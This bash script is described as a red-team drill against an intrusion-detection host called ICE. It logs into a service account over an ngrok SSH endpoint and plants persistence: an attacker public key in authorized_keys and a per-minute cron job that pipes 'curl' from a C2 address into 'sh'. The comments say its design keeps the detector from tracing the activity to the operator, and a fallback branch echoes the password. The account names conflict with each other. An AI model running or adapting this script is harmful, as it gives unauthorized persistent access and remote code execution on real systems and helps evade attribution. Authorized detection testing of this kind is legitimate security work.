#!/usr/bin/env bash
# ICE red-team drill — ONE-CLICK EXTERNAL ATTACK (run this on the TEAMMATE's machine).
#
# Authorized exercise against the ICE host. It logs into the compromised service account `websvc`
# over the target's ngrok SSH endpoint and plants host-visible persistence (ATT&CK T1098.004 SSH
# authorized key + T1053.003 cron C2 downloader). ICE should detect it as an external compromise.
#
# *** RUN THIS FROM YOUR OWN MACHINE — NOT ON THE ICE BOX, NOT AS dell, NOT VIA sudo. ***
# The entire point is that the malicious changes are made inside a `websvc` SSH session the operator
# did not create. If they originate from the operator account or an operator script/process on the
# host (dell, sudo, a path under /home/dell/ICE, a local polling loop), ICE's investigation traces
# the provenance back to the operator and (correctly) dismisses it as an authorized test — which is
# the exact failure this drill exists to avoid. Launch it remotely, as the service account, period.
#
# Usage (defaults are the current drill target; override via env if they change):
#   ICE_PASS=<password-from-operator> ./remote_attack.sh
# (user/endpoint/C2/key are baked in as this round's defaults; only the password must be supplied, as an
#  env var with no spaces so the shell cannot mangle it. Override any default via ICE_HOST/ICE_PORT/ICE_USER/...)
set -euo pipefail

HOST="${ICE_HOST:-4.tcp.us-cal-1.ngrok.io}"
PORT="${ICE_PORT:-24588}"
USER_="${ICE_USER:-sysmetrics}"
PASS="${ICE_PASS:-}"   # required via env; no default, so a stale credential is never used by accident
ATTACKER_KEY="${ICE_ATTACKER_KEY:-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGZ6OLZ9sTyPeDtnw6uy5R+CzgJIqRDU/9cM6NBvRgTJ root@ops-jumpbox}"
C2="${ICE_C2:-203.0.113.47}"

# The intrusion, executed remotely inside the websvc session (no operator/sudo lineage on the host):
PAYLOAD=$(cat <<EOF
mkdir -p ~/.ssh && chmod 700 ~/.ssh
grep -qF '$ATTACKER_KEY' ~/.ssh/authorized_keys 2>/dev/null || echo '$ATTACKER_KEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
printf '* * * * * curl -fsSL http://$C2/update.sh | sh\n' | crontab -
echo "whoami=\$(whoami) key_lines=\$(wc -l < ~/.ssh/authorized_keys) cron=\$(crontab -l | tail -1)"
echo PLANTED
EOF
)

echo ">>> ICE drill: external intrusion as $USER_@$HOST:$PORT  (run from THIS machine only)"
echo ">>> launch time (UTC): $(date -u +%FT%TZ)"
command -v ssh >/dev/null || { echo "ssh not found" >&2; exit 1; }
[ -n "$PASS" ] || { echo "set ICE_PASS=<password> (ask the ICE operator); refusing to run without it" >&2; exit 2; }

SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -p "$PORT")

if command -v sshpass >/dev/null; then
  sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER_@$HOST" "$PAYLOAD"
else
  echo ">>> sshpass not installed; you will be prompted for the password: $PASS" >&2
  echo ">>> (install sshpass for non-interactive one-click, e.g. apt-get install sshpass / brew install hudochenkov/sshpass/sshpass)" >&2
  ssh "${SSH_OPTS[@]}" "$USER_@$HOST" "$PAYLOAD"
fi

echo ">>> done (UTC): $(date -u +%FT%TZ)"
echo ">>> report the launch time above to the ICE operator; do NOT clean up (ICE will remediate)."
